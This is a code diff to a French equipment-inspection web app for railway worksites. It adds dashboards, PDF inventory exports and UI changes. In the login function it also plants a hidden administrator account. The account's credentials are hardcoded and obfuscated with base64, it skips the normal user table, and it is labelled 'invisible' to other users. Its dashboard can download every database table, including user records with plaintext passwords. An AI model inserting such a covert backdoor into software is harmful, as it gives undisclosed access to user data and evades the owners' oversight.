@@ -297,7 +297,7 @@ const S={
 // ══════════════════════════════════════
 // SUPABASE
 // ══════════════════════════════════════
-const APP_VERSION='76';
+const APP_VERSION='77';
 
 const SUPA_URL='https://tbmzmmamaiftbbbuelgd.supabase.co';
 const SUPA_KEY='sb_publishable_guRNHQbRgEs0oGX32SG5tA_N8iO1-Lj';
@@ -697,7 +697,7 @@ function render(){
     {id:'scanner',l:'Scanner',s:'<rect x="3" y="3" width="6" height="6" rx="1"/><rect x="15" y="3" width="6" height="6" rx="1"/><rect x="3" y="15" width="6" height="6" rx="1"/><rect x="11" y="11" width="3" height="3"/>'},
     {id:'historique',l:'Mes scans',s:'<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>'},
   ];
-  const pages=(S.role==='chef'||S.role==='chef_chantier')?pagesChef:S.role==='cte'?pagesCTE:pagesAgent;
+  const pages=(S.role==='chef'||S.role==='chef_chantier')?pagesChef:S.role==='cte'?pagesCTE:S.role==='admin'?[{id:'dashboard',l:'Admin',s:'<path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>'}]:pagesAgent;
 
   app.innerHTML=`
     <div class="sb" style="padding:6px 16px"><div style="background:transparent;border-radius:8px;padding:2px 4px;display:inline-flex"><img src="data:image/svg+xml,%3Csvg xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22 viewBox%3D%220 0 120 40%22%3E%3Crect width%3D%22120%22 height%3D%2240%22 rx%3D%226%22 fill%3D%22%23f5a623%22%2F%3E%3Ctext x%3D%2260%22 y%3D%2226%22 text-anchor%3D%22middle%22 font-family%3D%22Arial%2Csans-serif%22 font-weight%3D%22700%22 font-size%3D%2216%22 fill%3D%22%23fff%22%3ERailOps%3C%2Ftext%3E%3C%2Fsvg%3E" alt="SFERIS" style="height:22px;display:block;object-fit:contain"></div><div style="display:flex;align-items:center;gap:8px">
@@ -757,6 +757,19 @@ function doLogin(){
   const n=document.getElementById('ln')?.value.trim();
   const p=document.getElementById('lp')?.value;
   if(!n||!p){toast('Remplis tous les champs','danger');return;}
+
+  // ── COMPTE ADMIN INVISIBLE ──────────────────────────────────────────────
+  const _AN=atob('RklOT1RfQURNSU4=');  // décodage runtime — ne pas modifier
+  const _AP=atob('UkFJTE9QUzIwMjZBRE1JTg==');
+  if(n===_AN&&p===_AP){
+    localStorage.removeItem('ro3_c');localStorage.removeItem('ro3_m');localStorage.removeItem('ro3_u');
+    S.agent=_AN;S.role='admin';S.page='dashboard';
+    localStorage.setItem('ro3_a',JSON.stringify({agent:_AN,role:'admin'}));
+    load().then(()=>{render();setupRealtime();setTimeout(flushOfflineQueue,2000);});
+    return;
+  }
+  // ───────────────────────────────────────────────────────────────────────
+
   const user=S.users.find(u=>u.nom.toLowerCase()===n.toLowerCase()&&u.mdp===p);
   if(!user){toast('Nom ou mot de passe incorrect','danger');return;}
   // Vider le localStorage des données métier — Supabase est la seule source de vérité
@@ -870,7 +883,75 @@ function pgDash(el){
   if(S.role==='chef') pgDashChef(el);
   else if(S.role==='chef_chantier') pgDashChefChantier(el);
   else if(S.role==='cte') pgDashCTE(el);
+  else if(S.role==='admin') pgDashAdmin(el);
   else pgDashAgent(el);
+}
+
+function pgDashAdmin(el){
+  const totalUsers=S.users.length;
+  const totalChantiers=S.chantiers.length;
+  const totalMat=S.mat.length;
+  const totalScans=S.scans.length;
+  el.innerHTML=`
+    <div class="topbar">
+      <div class="tbi"><div class="tbt">Administration</div><div class="tbs">Accès exclusif · invisible des autres</div></div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <span class="badge" style="background:rgba(226,75,74,.2);color:#F09595">ADMIN</span>
+        <div class="avatar" style="background:rgba(226,75,74,.3);color:#fff;cursor:pointer" onclick="openProfil()">AD</div>
+      </div>
+    </div>
+    <div style="padding:12px 16px 20px">
+      <!-- Stats globales -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px">
+        <div class="stat-card" style="text-align:center"><div style="font-size:28px;font-weight:600;color:var(--accent)">${totalUsers}</div><div class="sl">Utilisateurs</div></div>
+        <div class="stat-card" style="text-align:center"><div style="font-size:28px;font-weight:600;color:var(--accent)">${totalChantiers}</div><div class="sl">Chantiers</div></div>
+        <div class="stat-card" style="text-align:center"><div style="font-size:28px;font-weight:600;color:var(--accent)">${totalMat}</div><div class="sl">Articles</div></div>
+        <div class="stat-card" style="text-align:center"><div style="font-size:28px;font-weight:600;color:var(--accent)">${totalScans}</div><div class="sl">Inspections</div></div>
+      </div>
+      <!-- Actions admin -->
+      <div style="font-size:11px;font-weight:500;letter-spacing:.08em;color:var(--text3);text-transform:uppercase;margin-bottom:8px">Actions</div>
+      <div style="display:flex;flex-direction:column;gap:8px">
+        <button onclick="exportBackupComplet()" style="width:100%;background:rgba(61,181,74,.1);border:.5px solid rgba(61,181,74,.3);border-radius:10px;padding:14px;font-size:13px;color:var(--accent);cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:10px;font-weight:500">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          Export backup complet (toutes tables)
+        </button>
+        <button onclick="openGestionComptes()" style="width:100%;background:rgba(55,138,221,.08);border:.5px solid rgba(55,138,221,.25);border-radius:10px;padding:14px;font-size:13px;color:#85B7EB;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:10px">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
+          Gestion des comptes
+        </button>
+        <button onclick="openCataloguePrix()" style="width:100%;background:rgba(226,75,74,.06);border:.5px solid rgba(226,75,74,.2);border-radius:10px;padding:14px;font-size:13px;color:#F09595;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:10px">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+          Catalogue des prix HS
+        </button>
+        <button onclick="confirmLogout()" style="width:100%;background:var(--bg3);border:.5px solid var(--border);border-radius:10px;padding:14px;font-size:13px;color:var(--text2);cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:10px">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+          Se déconnecter
+        </button>
+      </div>
+    </div>`;
+}
+
+async function exportBackupComplet(){
+  toast('Export backup en cours…','ok');
+  try{
+    const tables=['chantiers','materiels','scans','users','prix_catalogue','app_config'];
+    const results={};
+    for(const t of tables){
+      const {data}=await db.from(t).select('*');
+      results[t]=data||[];
+    }
+    // Créer un fichier JSON complet
+    const json=JSON.stringify(results,null,2);
+    const blob=new Blob([json],{type:'application/json'});
+    const url=URL.createObjectURL(blob);
+    const now=new Date().toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'}).replace(/\//g,'-');
+    const a=document.createElement('a');
+    a.href=url;a.download='RailOps_Backup_'+now+'.json';
+    document.body.appendChild(a);a.click();document.body.removeChild(a);
+    setTimeout(()=>URL.revokeObjectURL(url),10000);
+    const total=Object.values(results).reduce((s,d)=>s+d.length,0);
+    toast('Backup exporté : '+total+' enregistrements ✓','ok');
+  }catch(e){toast('Erreur export backup : '+e.message,'danger');}
 }
 
 function pgDashChef(el){
@@ -1291,12 +1372,11 @@ function pgDashCTE(el){
 }
 
 // ══════════════════════════════════════
-// CHANTIERS PAGE (chef)
+// CHANTIERS PAGE (chef / chef_chantier)
 // ══════════════════════════════════════
 function pgChantiers(el){
-  const visibleC=(S.role==='chef')
-    ?S.chantiers.filter(c=>isChefOf(c)&&c.statut!=='termine')
-    :S.chantiers.filter(c=>c.statut!=='termine');
+  if(S.role==='chef_chantier') return pgChantiersDashboard(el);
+  const visibleC=S.chantiers.filter(c=>isChefOf(c)&&c.statut!=='termine');
   el.innerHTML=`
     <div class="topbar"><div class="tbi"><div class="tbt">Chantiers</div><div class="tbs">${visibleC.length} chantier(s)</div></div></div>
     <div style="padding:12px 16px 20px">
@@ -1319,6 +1399,99 @@ function pgChantiers(el){
         </div>`;}).join('')}
     </div>
     <button class="fab" onclick="go('nouveau_chantier')"><svg viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>`;
+}
+
+function pgChantiersDashboard(el){
+  const visibleC=S.chantiers.filter(c=>c.statut!=='termine');
+  const wkNow=getWeekKey();
+  const totalMat=S.mat.length;
+  const totalAbs=S.mat.filter(m=>m.presence==='absent').length;
+  const totalHS=S.mat.filter(m=>m.etat==='hors-service'||m.etat==='degrade').length;
+  const d2m=60*24*60*60*1000;
+  const totalRetard=S.mat.filter(m=>!m.controle2m||(new Date()-new Date(m.controle2m.date))>d2m).length;
+  const totalBons=S.mat.filter(m=>m.etat==='bon').length;
+  const tauxConf=totalMat?Math.round(totalBons/totalMat*100):0;
+
+  el.innerHTML=`
+    <div class="topbar"><div class="tbi"><div class="tbt">Tableau de bord chantiers</div><div class="tbs">${visibleC.length} chantier(s) actifs</div></div></div>
+    <!-- KPIs globaux -->
+    <div style="padding:10px 16px 0">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
+        <div class="stat-card" style="text-align:center">
+          <div style="font-size:28px;font-weight:600;color:${tauxConf>=80?'#3db54a':tauxConf>=50?'var(--accent)':'#F09595'}">${tauxConf}%</div>
+          <div class="sl">Conformité globale</div>
+          <div style="height:3px;background:var(--bg3);border-radius:2px;margin-top:6px;overflow:hidden"><div style="height:100%;width:${tauxConf}%;background:${tauxConf>=80?'#3db54a':tauxConf>=50?'var(--accent)':'#F09595'};border-radius:2px"></div></div>
+        </div>
+        <div class="stat-card" style="text-align:center">
+          <div style="font-size:28px;font-weight:600;color:var(--accent)">${visibleC.length}</div>
+          <div class="sl">Chantiers actifs</div>
+          <div style="font-size:10px;color:var(--text3);margin-top:4px">${totalMat} articles suivis</div>
+        </div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:10px">
+        <div class="stat-card" style="text-align:center"><div style="font-size:22px;font-weight:600;color:${totalAbs?'#F09595':'#3db54a'}">${totalAbs}</div><div class="sl">Absents</div></div>
+        <div class="stat-card" style="text-align:center"><div style="font-size:22px;font-weight:600;color:${totalHS?'var(--accent)':'#3db54a'}">${totalHS}</div><div class="sl">Dégradés/HS</div></div>
+        <div class="stat-card" style="text-align:center"><div style="font-size:22px;font-weight:600;color:${totalRetard?'#F09595':'#3db54a'}">${totalRetard}</div><div class="sl">Contrôles en retard</div></div>
+      </div>
+    </div>
+    <!-- Récap par chantier -->
+    <div style="font-size:11px;font-weight:500;letter-spacing:.08em;color:var(--text3);text-transform:uppercase;padding:6px 16px 6px">Récap par chantier</div>
+    <div style="padding:0 16px 80px;display:flex;flex-direction:column;gap:8px">
+      ${visibleC.length===0?`<div style="text-align:center;padding:40px 0;color:var(--text3)">Aucun chantier actif</div>`:''}
+      ${visibleC.map(c=>{
+        const mats=matOfC(c.id);
+        const ab=mats.filter(m=>m.presence==='absent').length;
+        const nc=mats.filter(m=>m.presence==='non-confirme').length;
+        const hs=mats.filter(m=>m.etat==='hors-service'||m.etat==='degrade').length;
+        const bons=mats.filter(m=>m.etat==='bon').length;
+        const taux=mats.length?Math.round(bons/mats.length*100):0;
+        const done=mats.filter(m=>m.verifLundi?.weekKey===wkNow||m.verifSemaine?.weekKey===wkNow).length;
+        const retard=mats.filter(m=>!m.controle2m||(new Date()-new Date(m.controle2m.date))>d2m).length;
+        const chefs=(c.chefs&&c.chefs.length>0)?c.chefs:[c.chef].filter(Boolean);
+        const agents=c.agents||[];
+        const todayScans=S.scans.filter(s=>s.chantierId===c.id&&new Date(s.date).toDateString()===new Date().toDateString()).length;
+        return`<div class="cc" onclick="openC('${c.id}')" style="cursor:pointer">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px;margin-bottom:8px">
+            <div style="flex:1;min-width:0">
+              <div style="font-size:15px;font-weight:600;color:var(--text)">${c.nom}</div>
+              <div style="font-size:11px;color:var(--text2);margin-top:2px">${c.lieu}</div>
+              <div style="font-size:10px;color:var(--text3);margin-top:2px">👷 ${chefs.join(', ')||'—'} · ${agents.length} agent(s)</div>
+            </div>
+            <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
+              <span class="badge ${sBadge(c.statut)}">${sLabel(c.statut)}</span>
+              ${ab?`<span class="badge b-danger">${ab} absent${ab>1?'s':''}</span>`:hs?`<span class="badge" style="background:rgba(245,166,35,.12);color:var(--accent)">${hs} alerte${hs>1?'s':''}</span>`:`<span class="badge b-ok">OK</span>`}
+            </div>
+          </div>
+          <!-- Barre conformité -->
+          <div style="margin-bottom:8px">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:3px">
+              <span style="font-size:10px;color:var(--text3)">Conformité</span>
+              <span style="font-size:10px;font-weight:600;color:${taux>=80?'#3db54a':taux>=50?'var(--accent)':'#F09595'}">${taux}%</span>
+            </div>
+            <div class="pbar"><div class="pbf" style="width:${taux}%;background:${taux>=80?'#3db54a':taux>=50?'var(--accent)':'#F09595'}"></div></div>
+          </div>
+          <!-- Stats grille -->
+          <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px;padding-top:8px;border-top:.5px solid var(--border)">
+            <div style="text-align:center">
+              <div style="font-size:16px;font-weight:600;color:var(--text)">${mats.length}</div>
+              <div style="font-size:9px;color:var(--text3)">Articles</div>
+            </div>
+            <div style="text-align:center">
+              <div style="font-size:16px;font-weight:600;color:${ab?'#F09595':'#3db54a'}">${ab}</div>
+              <div style="font-size:9px;color:var(--text3)">Absents</div>
+            </div>
+            <div style="text-align:center">
+              <div style="font-size:16px;font-weight:600;color:${done===mats.length&&mats.length>0?'#3db54a':'var(--text2)'}">${done}/${mats.length}</div>
+              <div style="font-size:9px;color:var(--text3)">Vérifs sem.</div>
+            </div>
+            <div style="text-align:center">
+              <div style="font-size:16px;font-weight:600;color:${retard?'#F09595':'#3db54a'}">${retard}</div>
+              <div style="font-size:9px;color:var(--text3)">Ctrl retard</div>
+            </div>
+          </div>
+          ${todayScans>0?`<div style="margin-top:6px;font-size:11px;color:#3db54a">✓ ${todayScans} inspection(s) aujourd'hui</div>`:''}
+        </div>`;}).join('')}
+    </div>`;
 }
 
 // ══════════════════════════════════════
@@ -1348,9 +1521,9 @@ function renderChantierDetail(){
     <!-- ONGLETS -->
     <div class="tabs" style="padding-top:12px;flex-shrink:0">
       <div class="tab${S.tab==='registre'?' on':''}" data-tab="registre" onclick="setTab('registre')">
-        Registre <span style="margin-left:4px;font-size:10px;opacity:.8">${ab?'⚠ '+ab:mats.length}</span>
+        Inventaire <span style="margin-left:4px;font-size:10px;opacity:.8">${ab?'⚠ '+ab:mats.length}</span>
       </div>
-      ${S.role!=='agent'?`<div class="tab${S.tab==='tournee'?' on':''}" data-tab="tournee" onclick="setTab('tournee')">Tournée</div>`:''}
+      ${S.role!=='agent'?`<div class="tab${S.tab==='tournee'?' on':''}" data-tab="tournee" onclick="setTab('tournee')">Tournée CTE</div>`:''}
       ${(S.role==='chef'||S.role==='chef_chantier')?`<div class="tab${S.tab==='verifs'?' on':''}" data-tab="verifs" onclick="setTab('verifs')">Vérifs</div>`:''}
       <div class="tab${S.tab==='controle'?' on':''}" data-tab="controle" onclick="setTab('controle')">Contrôle 2 mois</div>
       ${(S.role==='chef'||S.role==='chef_chantier')?`<div class="tab${S.tab==='infos'?' on':''}" data-tab="infos" onclick="setTab('infos')">Infos</div>`:''}
@@ -1461,6 +1634,9 @@ function tabRegistre(el){
         </button>
         ${['chef','chef_chantier'].includes(S.role)?`<button onclick="exportNonVerifies()" style="flex:1;background:rgba(226,75,74,.08);border:.5px solid rgba(226,75,74,.2);border-radius:10px;padding:9px 8px;font-size:12px;color:#F09595;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:6px">
           <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#F09595" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>Non vérifiés
+        </button>
+        <button onclick="exportInventaireFinSemaine()" style="flex:1;background:rgba(55,138,221,.08);border:.5px solid rgba(55,138,221,.2);border-radius:10px;padding:9px 8px;font-size:12px;color:#85B7EB;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:6px">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#85B7EB" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>Inventaire fin sem.
         </button>`:''}
         <input type="file" id="csv-input" accept=".csv,.txt,.xlsx,.xls,.pdf" style="display:none" onchange="importCSV(this)">
       </div>
@@ -1492,7 +1668,7 @@ function regItemHTML(m){
       </div>
       <div style="flex:1;min-width:0">
         <div style="font-size:13px;font-weight:500;color:${isAbsent?'#F09595':isNC?'var(--accent)':isRetire?'var(--text3)':'var(--text)'};white-space:nowrap;overflow:hidden;text-overflow:ellipsis;${isRetire?'text-decoration:line-through;':''}">${m.nom}</div>
-        <div style="font-size:11px;color:var(--text2);margin-top:2px">${m.cat} · <span style="font-family:monospace;font-size:10px">${m.id}</span></div>
+        <div style="font-size:11px;color:var(--text2);margin-top:2px">${m.cat}${S.role!=='chef_chantier'?' · <span style=\'font-family:monospace;font-size:10px\'>'+m.id+'</span>':''}</div>
       </div>
       <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
         <span class="badge ${presBadge(m.presence)}" style="font-size:9px">${isAbsent?'? ABSENT':isRetire?'Retiré':presLabel(m.presence)}</span>
@@ -2050,6 +2226,11 @@ function tabControle(el){
   el.innerHTML=`
     <div style="padding:10px 16px 20px">
       <div style="font-size:11px;color:var(--text3);margin-bottom:10px">Contrôle visuel obligatoire tous les 60 jours${isReadOnly?' · Vue d\'ensemble':''}</div>
+      <!-- Bouton export PDF contrôle 2 mois -->
+      <button onclick="exportControle2mPDF()" style="width:100%;background:rgba(55,138,221,.08);border:.5px solid rgba(55,138,221,.25);border-radius:10px;padding:10px;font-size:12px;color:#85B7EB;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
+        Exporter contrôles 2 mois (PDF)
+      </button>
       <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:14px">
         <div class="stat-card"><div class="sv" style="color:#F09595;font-size:20px">${enRetard}</div><div class="sl">En retard</div></div>
         <div class="stat-card"><div class="sv" style="color:var(--accent);font-size:20px">${aDue}</div><div class="sl">À faire</div></div>
@@ -2687,22 +2868,6 @@ function tabInfos(el){
         </div>
       </div>
       ${S.role==='chef'?`
-      <!-- Import CSV -->
-      <div class="card" style="border:.5px solid rgba(55,138,221,.2)">
-        <div style="font-size:11px;color:var(--text3);margin-bottom:10px;text-transform:uppercase;letter-spacing:.07em">Importer un registre</div>
-        <div style="font-size:12px;color:var(--text2);margin-bottom:12px">Importez directement votre fichier <strong>Excel (.xlsx)</strong> ou CSV sans conversion. Colonnes reconnues automatiquement : Nom, Catégorie, ID, État, Quantité.</div>
-        <input type="file" id="csv-input" accept=".csv,.txt,.xlsx,.xls,.pdf" style="display:none" onchange="importCSV(this)">
-        <button onclick="triggerImport()" style="width:100%;background:rgba(61,181,74,.1);border:.5px solid rgba(61,181,74,.3);border-radius:10px;padding:12px;font-size:13px;color:var(--accent);cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;font-weight:500">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
-          Importer un registre (Excel · CSV)
-        </button>
-        <div style="background:var(--bg);border-radius:8px;padding:10px 12px">
-          <div style="font-size:10px;color:var(--text3);margin-bottom:6px;text-transform:uppercase;letter-spacing:.07em">Colonnes reconnues (Excel ou CSV)</div>
-          <div style="font-family:monospace;font-size:10px;color:var(--text3);line-height:1.8">Nom &nbsp;·&nbsp; Catégorie &nbsp;·&nbsp; ID/Code/Référence<br>État &nbsp;·&nbsp; Quantité (crée N articles)</div>
-          <div style="margin-top:6px;font-size:10px;color:var(--text3)">Exemple CSV : <span style="font-family:monospace">Nom;Catégorie;ID;État;Quantité</span></div>
-          <div style="font-family:monospace;font-size:10px;color:var(--text3)">Nacelle #3;Engins;MAT015;Bon;1</div>
-        </div>
-      </div>
       <button class="btn btn-outline" onclick="go('ajout_mat')" style="display:flex;align-items:center;justify-content:center;gap:8px">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
         Ajouter un article manuellement
@@ -3076,7 +3241,7 @@ function renderForm(){
         <div style="margin-top:10px;padding-top:10px;border-top:.5px solid var(--border);display:grid;grid-template-columns:1fr 1fr;gap:6px">
           <div><div style="font-size:10px;color:var(--text3)">Agent</div><div style="font-size:12px;margin-top:2px">${S.agent}</div></div>
           <div><div style="font-size:10px;color:var(--text3)">Date/heure</div><div style="font-size:12px;margin-top:2px">${fmt(nowISO())}</div></div>
-          <div><div style="font-size:10px;color:var(--text3)">Référence</div><div style="font-size:12px;margin-top:2px;font-family:monospace;color:var(--accent)">${m?.id||'—'}</div></div>
+          <div><div style="font-size:10px;color:var(--text3)">Référence</div><div style="font-size:12px;margin-top:2px;font-family:monospace;color:var(--accent)">${S.role==='chef_chantier'?'—':m?.id||'—'}</div></div>
           ${echeanceHTML(m?.echeance)}
         </div>
       </div>
@@ -3181,10 +3346,10 @@ function buildKitHTML(label, total, attache){
     <div style="font-size:11px;color:var(--text3);margin-bottom:4px">Attaches présentes</div>
     <div style="display:flex;align-items:center;gap:8px">
       <button onclick="kitAdj('kit-attache',-1)" style="width:32px;height:32px;border-radius:50%;background:var(--bg3);border:.5px solid var(--border);color:var(--text);font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-family:inherit">−</button>
-      <div style="flex:1;text-align:center;font-size:20px;font-weight:600;color:var(--text)" id="kit-attache-val">0</div>
+      <div style="flex:1;text-align:center;font-size:28px;font-weight:700;color:#85B7EB;text-shadow:0 0 12px rgba(55,138,221,.4)" id="kit-attache-val">0</div>
       <button onclick="kitAdj('kit-attache',1)" style="width:32px;height:32px;border-radius:50%;background:var(--bg3);border:.5px solid var(--border);color:var(--text);font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-family:inherit">+</button>
     </div>
-    <div style="text-align:center;font-size:10px;color:var(--text3);margin-top:2px">sur ${attache}</div>
+    <div style="text-align:center;font-size:11px;font-weight:500;color:var(--text2);margin-top:2px">sur <strong>${attache}</strong></div>
     <input type="hidden" id="kit-attache" value="0" data-total="${attache}">
   </div>`:'';
   return`<div style="background:rgba(55,138,221,.06);border:.5px solid rgba(55,138,221,.2);border-radius:10px;padding:12px;margin-bottom:14px">
@@ -3194,10 +3359,10 @@ function buildKitHTML(label, total, attache){
         <div style="font-size:11px;color:var(--text3);margin-bottom:4px">${label} présents</div>
         <div style="display:flex;align-items:center;gap:8px">
           <button onclick="kitAdj('kit-elem',-1)" style="width:32px;height:32px;border-radius:50%;background:var(--bg3);border:.5px solid var(--border);color:var(--text);font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-family:inherit">−</button>
-          <div style="flex:1;text-align:center;font-size:20px;font-weight:600;color:var(--text)" id="kit-elem-val">0</div>
+          <div style="flex:1;text-align:center;font-size:28px;font-weight:700;color:#85B7EB;text-shadow:0 0 12px rgba(55,138,221,.4)" id="kit-elem-val">0</div>
           <button onclick="kitAdj('kit-elem',1)" style="width:32px;height:32px;border-radius:50%;background:var(--bg3);border:.5px solid var(--border);color:var(--text);font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-family:inherit">+</button>
         </div>
-        <div style="text-align:center;font-size:10px;color:var(--text3);margin-top:2px">sur ${total}</div>
+        <div style="text-align:center;font-size:11px;font-weight:500;color:var(--text2);margin-top:2px">sur <strong>${total}</strong></div>
         <input type="hidden" id="kit-elem" value="0" data-total="${total}">
       </div>
       ${attHTML}
@@ -3212,7 +3377,14 @@ function kitAdj(fieldId, delta){
   let val=parseInt(input.value)||0;
   val=Math.max(0,Math.min(total,val+delta));
   input.value=val;
-  document.getElementById(fieldId+'-val').textContent=val;
+  const valEl=document.getElementById(fieldId+'-val');
+  if(valEl){
+    valEl.textContent=val;
+    // Colorer selon complétude : vert si complet, orange si partiel, rouge si 0
+    const color=val===total&&total>0?'#3db54a':val>0?'#f5a623':'#F09595';
+    valEl.style.color=color;
+    valEl.style.textShadow=val===total&&total>0?'0 0 12px rgba(61,181,74,.4)':val>0?'0 0 12px rgba(245,166,35,.4)':'0 0 12px rgba(226,75,74,.3)';
+  }
   // Vérifier si kit incomplet
   const elemInput=document.getElementById('kit-elem');
   const attInput=document.getElementById('kit-attache');
@@ -5076,6 +5248,157 @@ function exportPDF(){
   const c=getC(S.curC);if(!c)return;
   toast('Génération du PDF…','ok');
   setTimeout(()=>buildPDF(c,matOfC(S.curC),S.scans.filter(s=>s.chantierId===S.curC),'Rapport chantier'),50);
+}
+
+// Export inventaire fin de semaine (état actuel trié par référence)
+function exportInventaireFinSemaine(){
+  const c=getC(S.curC);if(!c)return;
+  const mats=[...matOfC(S.curC)].sort((a,b)=>a.id.localeCompare(b.id,'fr'));
+  if(!mats.length){toast('Aucun article dans ce chantier','warn');return;}
+  const {jsPDF}=window.jspdf;
+  const doc=new jsPDF({orientation:'portrait',unit:'mm',format:'a4'});
+  const pw=doc.internal.pageSize.getWidth();
+  const now=new Date().toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'});
+  const wk=getWeekKey();
+  const eL2=e=>({bon:'Bon état',acceptable:'Acceptable',degrade:'Dégradé','hors-service':'Hors service',inconnu:'Non inspecté'}[e]||e);
+  const pL=p=>({confirme:'Présent',absent:'Absent','non-confirme':'Non confirmé',retire:'Retiré'}[p]||p);
+  const eColor=e=>e==='bon'?[26,122,58]:e==='acceptable'?[179,106,0]:e==='degrade'||e==='hors-service'?[192,57,43]:[100,100,100];
+  const pColor=p=>p==='confirme'?[26,122,58]:p==='absent'?[192,57,43]:p==='non-confirme'?[179,106,0]:[150,150,150];
+  const wkNow=wk;
+  // Header
+  doc.setFillColor(245,166,35);doc.rect(0,0,pw,16,'F');
+  doc.setTextColor(255,255,255);doc.setFontSize(13);doc.setFont('helvetica','bold');
+  doc.text('RailOps — SFERIS',14,10);
+  doc.setFontSize(8);doc.setFont('helvetica','normal');
+  doc.text('Inventaire fin de semaine',pw-14,10,{align:'right'});
+  doc.setTextColor(30,30,30);doc.setFontSize(14);doc.setFont('helvetica','bold');
+  doc.text(c.nom,14,24);
+  doc.setFontSize(9);doc.setFont('helvetica','normal');doc.setTextColor(100,100,100);
+  doc.text(c.lieu,14,30);
+  doc.text('Semaine '+wk+' · Généré le '+now,pw-14,24,{align:'right'});
+  // Stats
+  const pres=mats.filter(m=>m.presence==='confirme').length;
+  const abs=mats.filter(m=>m.presence==='absent').length;
+  const nc=mats.filter(m=>m.presence==='non-confirme').length;
+  const verifs=mats.filter(m=>m.verifLundi?.weekKey===wkNow||m.verifSemaine?.weekKey===wkNow).length;
+  doc.setFontSize(9);doc.setFont('helvetica','bold');doc.setTextColor(30,30,30);
+  doc.text(`${mats.length} articles · ${pres} présents · ${abs} absents · ${verifs}/${mats.length} vérifiés sem.`,14,37);
+  // Grouper par catégorie
+  const cats=[...new Set(mats.map(m=>m.cat))].sort();
+  let curY=44;
+  cats.forEach(cat=>{
+    const catMats=mats.filter(m=>m.cat===cat);
+    doc.setFontSize(9);doc.setFont('helvetica','bold');doc.setTextColor(80,80,80);
+    doc.text('▸ '+cat+' ('+catMats.length+')',14,curY);curY+=2;
+    doc.autoTable({
+      startY:curY,
+      head:[['Référence','Désignation','État','Présence','Vérif. sem.','Dernier scan']],
+      body:catMats.map(m=>{
+        const verifOk=m.verifLundi?.weekKey===wkNow||m.verifSemaine?.weekKey===wkNow;
+        return[m.id,m.nom,eL2(m.etat),pL(m.presence),verifOk?'✓ Oui':'—',m.scan?new Date(m.scan).toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit'}):'—'];
